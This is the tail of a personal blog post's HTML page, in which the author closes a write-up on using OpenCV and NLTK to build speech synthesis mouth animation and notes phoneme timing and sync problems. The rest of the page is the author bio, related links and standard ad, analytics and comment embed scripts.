<p>Also, all the speech libraries I have looked does not provide a true API to easily do the syncing. In the example I had to guess the phonemes times and use it along with the mouth visualization. Sometimes I get awful animations, totally unsync. I haven’t had time to investigate these libraries deeply, but it seems that if I want to have this level of detail, I’ll have to make my own. Besides all that, NLTK is a great way to process words into phonemes and OpenCV is really useful when dealing with images.</p>

<p>Thanks for reading, and I appreciate any feedback. See ya.</p>

      <hr />
      <footer role="contentinfo">
        <div class="article-author-bottom">
          


	<img src="http://localhost:4000/images/me.png" class="bio-photo" alt="Luiz Guilherme bio photo">

<h3>Luiz Guilherme</h3>
<p>Game Developer, Software Engineer, Photographer, Ukulele Player</p>
<a href="mailto:luiz@kaze.io" class="author-social" target="_blank"><i class="fa fa-fw fa-envelope-square"></i> Email</a>
<a href="http://twitter.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a>
<a href="http://facebook.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-facebook-square"></i> Facebook</a>

<a href="http://linkedin.com/in/luizgosantos" class="author-social" target="_blank"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a>
<a href="http://instagram.com/kaze_" class="author-social" target="_blank"><i class="fa fa-fw fa-instagram"></i> Instagram</a>
<a href="http://www.flickr.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-flickr"></i> Flickr</a>
<a href="http://kazen0tenshi.deviantart.com" class="author-social" target="_blank"><i class="fa fa-fw fa-deviantart"></i> Deviant Art</a>

<a href="http://github.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-github"></i> Github</a>





<a href="http://steamcommunity.com/id/kazen0tenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-steam-square"></i> Steam</a>
<a href="https://youtube.com/user/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-youtube-square"></i> Youtube</a>


        </div>
        <p class="byline"><strong>Using openCV and NLTK to Make Speech Synthesis Animation</strong> was published on <time datetime="2015-06-16T13:20:32+01:00">June 16, 2015</time>.</p>
      </footer>
    </div><!-- /.article-wrap -->
  
    <section id="disqus_thread"></section><!-- /#disqus_thread -->
  
  </article>
</div><!-- /#main -->

<div class="footer-wrap">
  <div class="related-articles">
  <h4>You might also enjoy <small class="pull-right">(<a href="http://localhost:4000/posts/">View all posts</a>)</small></h4>
    <ul>
    
      <li><a href="http://localhost:4000/personal/leaving-the-comfort-zone-for-the-second-time/" title="Leaving the Comfort Zone (for the Second Time)">Leaving the Comfort Zone (for the Second Time)</a></li>
    
      <li><a href="http://localhost:4000/game/development/global-game-jam-2016-thoughts-experiences-and-a-small-post-mortem/" title="Global Game Jam 2016 - Thoughts, Experiences and a Small Post-Mortem">Global Game Jam 2016 - Thoughts, Experiences and a Small Post-Mortem</a></li>
    
      <li><a href="http://localhost:4000/personal/the-big-change/" title="The Big Change">The Big Change</a></li>
    
    </ul>
    <hr />
  </div><!-- /.related-articles -->
  <footer>
    
<div class="google-ads">
  <!-- 320 x 50 ad -->
  <script async src="http://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <ins class="adsbygoogle"
       style="display:inline-block;width:320px;height:50px"
       data-ad-client="ca-pub-5447213706109611"
       data-ad-slot="2221748488"></ins>
  <script>
  (adsbygoogle = window.adsbygoogle || []).push({});
  </script>
</div><!-- /.google-ads -->


<span>&copy; 2017 Luiz Guilherme. Powered by <a href="http://jekyllrb.com" rel="nofollow">Jekyll</a> adapted from <a href="http://mademistakes.com/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a> theme.</span>

  </footer>
</div><!-- /.footer-wrap -->

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script>window.jQuery || document.write('<script src="http://localhost:4000/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
<script src="http://localhost:4000/assets/js/scripts.min.js"></script>

<!-- Asynchronous Google Analytics snippet -->
<script>
  var _gaq = _gaq || [];
  var pluginUrl = 
 '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
  _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
  _gaq.push(['_setAccount', 'UA-58347343-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>


  
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'kazeio'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

	        

</body>
</html>